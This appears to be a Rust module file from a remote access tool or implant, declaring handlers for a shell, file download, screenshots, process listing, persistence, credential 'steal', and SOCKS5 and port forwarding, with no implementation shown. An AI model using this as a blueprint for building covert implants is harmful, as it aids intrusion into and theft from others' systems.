use anyhow::Result;
use serde_json::Value;

pub mod shell;
pub mod file_list;
pub mod file_download;
pub mod screenshot;
pub mod process_list;
pub mod persist_status;
pub mod persist_remove;
pub mod steal;
#[cfg(feature = "http-transport")]
pub mod socks5;
#[cfg(feature = "http-transport")]
pub mod portfwd;

pub trait CommandHandler: Send + Sync {
    fn execute(&self, args: Value) -> Result<Value>;
}
